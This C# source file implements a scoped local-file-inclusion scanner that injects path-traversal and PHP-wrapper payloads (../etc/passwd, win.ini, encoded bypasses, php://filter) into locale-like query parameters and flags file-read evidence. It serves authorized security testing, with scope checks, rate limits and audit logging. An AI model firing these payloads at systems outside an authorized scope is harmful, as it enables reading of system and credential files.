using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Drederick.Audit;

namespace Drederick.Recon.Http;

/// <summary>
/// GAP-035 / CVE-2025-49132-shape generic locale-parameter LFI probe.
/// Tests query parameters whose names match a locale-shaped allow-list
/// (lang, locale, page, file, template, …) against a curated set of
/// path-traversal / file-read payloads (../etc/passwd, PHP wrappers,
/// double-encoded bypasses, null-byte truncation, Unicode bypasses).
///
/// Scope-first: the first statement of every public entry point is
/// <c>_scope.Require(baseUrlHost)</c>. The base URL must parse to an
/// IP host inside scope; redirects to hostnames or off-scope IPs are
/// inspected (no auto-follow) and rejected without recording the
/// off-scope target as a finding. Body content is NEVER logged — only
/// the SHA-256 of the first 8 KiB plus the structured evidence label
/// (<c>passwd_marker</c>, <c>win_ini_marker</c>, <c>php_source</c>,
/// <c>base64_blob</c>, <c>length_anomaly</c>).
/// </summary>
public sealed partial class LocaleLfiProbe : IReconTool
{
    public string Name => "locale-lfi";

    public string Description =>
        "GAP-035 generic locale-parameter LFI probe: replaces query params whose " +
        "names match a locale-shaped allow-list (lang, locale, page, file, " +
        "template, include, …) with path-traversal / PHP-wrapper payloads, " +
        "captures status + body fingerprint, and flags confirmed file-read " +
        "vulnerabilities. Read-only HTTP GET; never follows redirects off-scope.";

    public const int DefaultMaxProbes = 100;
    public const int DefaultRatePerSecond = 10;
    private const int MaxBodySampleBytes = 8 * 1024;
    private static readonly TimeSpan ConnectTimeout = TimeSpan.FromSeconds(5);
    private static readonly TimeSpan ResponseTimeout = TimeSpan.FromSeconds(15);
    private const string SentinelValue = "drederick_baseline_sentinel_x9q2";

    public static readonly IReadOnlyCollection<string> DefaultParamNames =
        new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "lang", "locale", "language", "l", "lng", "loc", "region", "country",
            "i18n", "translation", "template", "view", "page", "file", "path",
            "include", "module",
        };

    internal readonly record struct ProbePayload(string Class, string Value);

    internal static readonly ProbePayload[] Payloads = new[]
    {
        new ProbePayload("linux_passwd",   "../../../../etc/passwd"),
        new ProbePayload("windows_winini", "../../../../windows/win.ini"),
        new ProbePayload("dotslash_bypass","....//....//....//etc/passwd"),
        new ProbePayload("pct_encoded",    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        new ProbePayload("unicode_bypass", "..%c0%af..%c0%af..%c0%afetc/passwd"),
        new ProbePayload("nullbyte",       "/etc/passwd%00.html"),
        new ProbePayload("php_filter",     "php://filter/convert.base64-encode/resource=index.php"),
        new ProbePayload("php_data",       "data:text/plain,foo"),
    };

    [GeneratedRegex(@"^[A-Za-z0-9+/=\r\n\s]{200,}$", RegexOptions.CultureInvariant)]
    private static partial Regex Base64BlobRegex();

    [GeneratedRegex(@"<a\s[^>]*href\s*=\s*['""]([^'""]+)['""]",
        RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex AnchorHrefRegex();

    [GeneratedRegex(@"<form\b([^>]*)>(.*?)</form>",
        RegexOptions.IgnoreCase | RegexOptions.Singleline | RegexOptions.CultureInvariant)]
    private static partial Regex FormBlockRegex();

    [GeneratedRegex(@"action\s*=\s*['""]([^'""]*)['""]",
        RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex FormActionRegex();

    [GeneratedRegex(@"<(?:input|select|textarea)\s[^>]*\bname\s*=\s*['""]([^'""]+)['""]",
        RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex InputNameRegex();

    private readonly Scope.Scope _scope;
    private readonly AuditLog _audit;
    private readonly HttpClient _http;
    private readonly bool _ownsHttpClient;

    public LocaleLfiProbe(Scope.Scope scope, AuditLog audit, HttpClient? httpClient = null)
    {
        _scope = scope;
        _audit = audit;
        if (httpClient is null)
        {
            var handler = new HttpClientHandler
            {
                AllowAutoRedirect = false,
                ServerCertificateCustomValidationCallback = (_, _, _, _) => true,
            };
            _http = new HttpClient(handler)
            {
                Timeout = ResponseTimeout,
            };
            _http.DefaultRequestHeaders.UserAgent.ParseAdd("drederick/0.1 (+locale-lfi)");
            _ownsHttpClient = true;
        }
        else
        {
            _http = httpClient;
            _ownsHttpClient = false;
        }
    }

    /// <summary>
    /// Extract locale-shaped <c>(absoluteUrl, paramName)</c> tuples from
    /// HTML at <paramref name="baseUrl"/>. Pulls query strings out of
    /// <c>&lt;a href&gt;</c> anchors plus form actions + input names.
    /// Returns an ordered, de-duplicated candidate list filtered to
    /// <see cref="DefaultParamNames"/> ∪ <paramref name="extraParams"/>.
    /// </summary>
    public static IReadOnlyList<(string Url, string Parameter)> ExtractCandidates(
        string baseUrl,
        string html,
        IEnumerable<string>? extraParams = null)
    {
        if (string.IsNullOrEmpty(html)) return Array.Empty<(string, string)>();
        if (!Uri.TryCreate(baseUrl, UriKind.Absolute, out var baseUri))
            return Array.Empty<(string, string)>();

        var allowed = new HashSet<string>(DefaultParamNames, StringComparer.OrdinalIgnoreCase);
        if (extraParams is not null)
        {
            foreach (var p in extraParams)
            {
                if (!string.IsNullOrWhiteSpace(p)) allowed.Add(p.Trim());
            }
        }

        var results = new List<(string Url, string Parameter)>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        void Emit(Uri target, string param)
        {
            if (!allowed.Contains(param)) return;
            var key = target.GetLeftPart(UriPartial.Path) + "|" + param;
            if (seen.Add(key))
            {
                results.Add((target.GetLeftPart(UriPartial.Path), param));
            }
        }

        foreach (Match m in AnchorHrefRegex().Matches(html))
        {
            var href = WebUtility.HtmlDecode(m.Groups[1].Value);
            if (!Uri.TryCreate(baseUri, href, out var abs)) continue;
            if (string.IsNullOrEmpty(abs.Query)) continue;
            foreach (var name in ParseQueryNames(abs.Query))
                Emit(abs, name);
        }

        foreach (Match fm in FormBlockRegex().Matches(html))
        {
            var attrs = fm.Groups[1].Value;
            var body = fm.Groups[2].Value;
            var actionM = FormActionRegex().Match(attrs);
            var action = actionM.Success ? WebUtility.HtmlDecode(actionM.Groups[1].Value) : "";
            if (!Uri.TryCreate(baseUri, string.IsNullOrEmpty(action) ? "." : action, out var formUri))
                continue;
            foreach (Match inm in InputNameRegex().Matches(body))
            {
                Emit(formUri, inm.Groups[1].Value);
            }
        }

        return results;
    }

    private static IEnumerable<string> ParseQueryNames(string query)
    {
        if (string.IsNullOrEmpty(query)) yield break;
        var q = query.StartsWith('?') ? query[1..] : query;
        foreach (var part in q.Split('&', StringSplitOptions.RemoveEmptyEntries))
        {
            var eq = part.IndexOf('=');
            var name = eq >= 0 ? part[..eq] : part;
            name = WebUtility.UrlDecode(name);
            if (!string.IsNullOrEmpty(name)) yield return name;
        }
    }

    /// <summary>
    /// Probe each <c>(url, parameter)</c> tuple in
    /// <paramref name="candidates"/> against the curated payload set.
    /// Scope is enforced on the base URL host and re-validated against
    /// every <c>Location</c> header before the redirect is consulted.
    /// </summary>
    public async Task<LocaleLfiResult> ProbeAsync(
        string baseUrl,
        IReadOnlyList<(string Url, string Parameter)>? candidates = null,
        string? discoveryHtml = null,
        IEnumerable<string>? extraParams = null,
        int maxProbes = DefaultMaxProbes,
        int ratePerSecond = DefaultRatePerSecond,
        CancellationToken ct = default)
    {
        if (string.IsNullOrEmpty(baseUrl))
            throw new ArgumentException("baseUrl must not be empty.", nameof(baseUrl));
        if (Scope.ArgvValidator.ContainsShellMetachars(baseUrl))
            throw new ArgumentException($"Invalid baseUrl '{baseUrl}': contains shell metacharacters.", nameof(baseUrl));
        if (!Uri.TryCreate(baseUrl, UriKind.Absolute, out var baseUri)
            || (baseUri.Scheme != Uri.UriSchemeHttp && baseUri.Scheme != Uri.UriSchemeHttps))
        {
            throw new ArgumentException(
                $"baseUrl '{baseUrl}' must be an absolute http(s) URL.", nameof(baseUrl));
        }
        if (!IPAddress.TryParse(baseUri.Host, out _))
        {
            throw new ArgumentException(
                $"baseUrl host '{baseUri.Host}' must be a literal IP address (scope authorizes IPs only).",
                nameof(baseUrl));
        }

        _scope.Require(baseUri.Host);

        if (maxProbes < 1) maxProbes = 1;
        if (ratePerSecond < 1) ratePerSecond = 1;
        if (ratePerSecond > 1000) ratePerSecond = 1000;

        var result = new LocaleLfiResult();

        // Build candidate list: explicit list wins; else parse HTML.
        IReadOnlyList<(string Url, string Parameter)> cands;
        if (candidates is { Count: > 0 })
        {
            cands = candidates;
        }
        else if (!string.IsNullOrEmpty(discoveryHtml))
        {
            cands = ExtractCandidates(baseUrl, discoveryHtml, extraParams);
        }
        else
        {
            cands = Array.Empty<(string, string)>();
        }

        // Re-validate every candidate URL host (defence in depth: HTML
        // discovery may yield off-host absolute URLs).
        var filtered = new List<(string Url, string Parameter)>();
        foreach (var c in cands)
        {
            if (!Uri.TryCreate(c.Url, UriKind.Absolute, out var cu)) continue;
            if (!IPAddress.TryParse(cu.Host, out _)) continue;
            try { _scope.Require(cu.Host); }
            catch (Scope.ScopeException) { continue; }
            filtered.Add(c);
        }

        _audit.Record("locale-lfi.start", new Dictionary<string, object?>
        {
            ["base_url"] = baseUri.GetLeftPart(UriPartial.Authority),
            ["candidates"] = filtered.Count,
            ["max_probes"] = maxProbes,
            ["rate_per_second"] = ratePerSecond,
        });

        var sw = Stopwatch.StartNew();
        int probes = 0;
        var minInterval = TimeSpan.FromSeconds(1.0 / ratePerSecond);

        try
        {
            foreach (var (url, param) in filtered)
            {
                if (probes >= maxProbes) break;
                if (ct.IsCancellationRequested) break;

                BaselineSnapshot? baseline = null;
                try
                {
                    baseline = await SendOneAsync(url, param, SentinelValue, "baseline", ct)
                        .ConfigureAwait(false);
                }
                catch (Exception ex)
                {
                    _audit.Record("locale-lfi.error", new Dictionary<string, object?>
                    {
                        ["url"] = url,
                        ["parameter"] = param,
                        ["phase"] = "baseline",
                        ["error_type"] = ex.GetType().Name,
                    });
                }
                probes++;
                result.ProbedUrls.Add($"{url}?{param}={SentinelValue}");

                foreach (var payload in Payloads)
                {
                    if (probes >= maxProbes) break;
                    if (ct.IsCancellationRequested) break;

                    var expected = TimeSpan.FromTicks(minInterval.Ticks * probes);
                    var elapsed = sw.Elapsed;
                    if (elapsed < expected)
                    {
                        try { await Task.Delay(expected - elapsed, ct).ConfigureAwait(false); }
                        catch (OperationCanceledException) { break; }
                    }

                    BaselineSnapshot? snap = null;
                    try
                    {
                        snap = await SendOneAsync(url, param, payload.Value, payload.Class, ct)
                            .ConfigureAwait(false);
                    }
                    catch (Exception ex)
                    {
                        _audit.Record("locale-lfi.error", new Dictionary<string, object?>
                        {
                            ["url"] = url,
                            ["parameter"] = param,
                            ["payload_class"] = payload.Class,
                            ["error_type"] = ex.GetType().Name,
                        });
                    }
                    probes++;
                    result.ProbedUrls.Add($"{url}?{param}={Uri.EscapeDataString(payload.Value)}");

                    if (snap is null) continue;
                    var finding = Classify(url, param, payload, snap.Value, baseline);
                    if (finding is not null) result.Findings.Add(finding);
                }
            }
        }
        catch (Exception ex)
        {
            result.Error = ex.Message;
        }

        _audit.Record("locale-lfi.finish", new Dictionary<string, object?>
        {
            ["base_url"] = baseUri.GetLeftPart(UriPartial.Authority),
            ["probes"] = probes,
            ["findings"] = result.Findings.Count,
            ["error"] = result.Error,
        });

        return result;
    }

    internal readonly record struct BaselineSnapshot(
        int StatusCode,
        long ContentLength,
        string BodySampleSha256,
        string? PasswdMarker,
        string? WinIniMarker,
        bool LooksLikePhpSource,
        bool LooksLikeBase64Blob,
        bool RedirectRejected);

    private async Task<BaselineSnapshot> SendOneAsync(
        string url, string param, string value, string payloadClass, CancellationToken ct)
    {
        var probeUri = AppendOrReplaceParam(url, param, value);
        using var req = new HttpRequestMessage(HttpMethod.Get, probeUri);

        using var connectCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
        connectCts.CancelAfter(ResponseTimeout);

        using var resp = await _http
            .SendAsync(req, HttpCompletionOption.ResponseHeadersRead, connectCts.Token)
            .ConfigureAwait(false);

        // Reject any redirect whose Location resolves to an off-scope
        // host. We never follow redirects in this tool — but the
        // Location header is itself a signal we audit + surface.
        bool redirectRejected = false;
        if ((int)resp.StatusCode is >= 300 and < 400 && resp.Headers.Location is { } loc)
        {
            Uri? abs = loc.IsAbsoluteUri ? loc : new Uri(new Uri(probeUri), loc);
            if (abs.Host is { Length: > 0 } h)
            {
                if (!IPAddress.TryParse(h, out _))
                {
                    redirectRejected = true;
                }
                else
                {
                    try { _scope.Require(h); }
                    catch (Scope.ScopeException) { redirectRejected = true; }
                }
            }
        }

        byte[] sampleBytes;
        long totalLen;
        if (redirectRejected)
        {
            sampleBytes = Array.Empty<byte>();
            totalLen = 0;
        }
        else
        {
            (sampleBytes, totalLen) = await ReadBoundedAsync(resp, connectCts.Token).ConfigureAwait(false);
        }

        var bodySample = sampleBytes.Length == 0
            ? ""
            : Encoding.UTF8.GetString(sampleBytes);

        string sha256 = Convert.ToHexString(SHA256.HashData(sampleBytes)).ToLowerInvariant();

        var snap = new BaselineSnapshot(
            StatusCode: (int)resp.StatusCode,
            ContentLength: totalLen,
            BodySampleSha256: sha256,
            PasswdMarker: bodySample.Contains("root:x:0:0:", StringComparison.Ordinal) ? "root:x:0:0:" : null,
            WinIniMarker: ContainsAny(bodySample, "[boot loader]", "[fonts]"),
            LooksLikePhpSource: bodySample.StartsWith("<?php", StringComparison.OrdinalIgnoreCase),
            LooksLikeBase64Blob: LooksLikeBase64(bodySample),
            RedirectRejected: redirectRejected);

        _audit.Record("locale-lfi.probe", new Dictionary<string, object?>
        {
            ["url"] = url,
            ["parameter"] = param,
            ["payload_class"] = payloadClass,
            ["status"] = snap.StatusCode,
            ["content_length"] = snap.ContentLength,
            ["body_sha256"] = snap.BodySampleSha256,
            ["redirect_rejected"] = snap.RedirectRejected,
        });

        return snap;
    }

    private static async Task<(byte[] Sample, long Total)> ReadBoundedAsync(
        HttpResponseMessage resp, CancellationToken ct)
    {
        await using var s = await resp.Content.ReadAsStreamAsync(ct).ConfigureAwait(false);
        var sample = new MemoryStream();
        var buf = new byte[4096];
        long total = 0;
        while (true)
        {
            int n = await s.ReadAsync(buf.AsMemory(), ct).ConfigureAwait(false);
            if (n <= 0) break;
            total += n;
            if (sample.Length < MaxBodySampleBytes)
            {
                int take = (int)Math.Min(n, MaxBodySampleBytes - sample.Length);
                sample.Write(buf, 0, take);
            }
            if (total > 5_000_000) break; // 5 MB hard cap per response
        }
        return (sample.ToArray(), total);
    }

    private static string? ContainsAny(string body, params string[] markers)
    {
        foreach (var m in markers)
        {
            if (body.Contains(m, StringComparison.OrdinalIgnoreCase)) return m;
        }
        return null;
    }

    private static bool LooksLikeBase64(string body)
    {
        if (body.Length < 200) return false;
        var trimmed = body.Trim();
        return trimmed.Length >= 200 && Base64BlobRegex().IsMatch(trimmed);
    }

    private static LocaleLfiFinding? Classify(
        string url, string param, ProbePayload payload,
        BaselineSnapshot snap, BaselineSnapshot? baseline)
    {
        if (snap.RedirectRejected) return null;

        if (snap.PasswdMarker is not null)
        {
            return Make(url, param, payload, snap, "passwd_marker", 0.99);
        }
        if (snap.WinIniMarker is not null)
        {
            return Make(url, param, payload, snap, "win_ini_marker", 0.95);
        }
        if (snap.StatusCode == 200 && snap.LooksLikeBase64Blob && payload.Class == "php_filter")
        {
            return Make(url, param, payload, snap, "base64_blob", 0.9);
        }
        if (snap.StatusCode == 200 && snap.LooksLikePhpSource)
        {
            return Make(url, param, payload, snap, "php_source", 0.85);
        }
        if (baseline is { } b && b.StatusCode == snap.StatusCode)
        {
            long delta = Math.Abs(snap.ContentLength - b.ContentLength);
            long threshold = Math.Max(200, b.ContentLength / 2);
            if (delta >= threshold && b.ContentLength > 0)
            {
                return Make(url, param, payload, snap, "length_anomaly", 0.4);
            }
        }
        return null;
    }

    private static LocaleLfiFinding Make(
        string url, string param, ProbePayload payload, BaselineSnapshot snap,
        string evidence, double confidence) => new()
    {
        Url = url,
        Parameter = param,
        Payload = payload.Class,
        Evidence = evidence,
        Confidence = confidence,
        StatusCode = snap.StatusCode,
        BodySampleSha256 = snap.BodySampleSha256,
    };

    private static string AppendOrReplaceParam(string url, string param, string value)
    {
        var u = new Uri(url, UriKind.Absolute);
        var existing = u.Query.Length > 1 ? u.Query[1..] : "";
        var parts = existing.Length > 0
            ? existing.Split('&', StringSplitOptions.RemoveEmptyEntries).ToList()
            : new List<string>();
        bool replaced = false;
        for (int i = 0; i < parts.Count; i++)
        {
            var eq = parts[i].IndexOf('=');
            var name = eq >= 0 ? parts[i][..eq] : parts[i];
            if (string.Equals(WebUtility.UrlDecode(name), param, StringComparison.OrdinalIgnoreCase))
            {
                parts[i] = $"{Uri.EscapeDataString(param)}={Uri.EscapeDataString(value)}";
                replaced = true;
            }
        }
        if (!replaced)
        {
            parts.Add($"{Uri.EscapeDataString(param)}={Uri.EscapeDataString(value)}");
        }
        var rebuilt = new UriBuilder(u) { Query = string.Join('&', parts) };
        return rebuilt.Uri.ToString();
    }
}
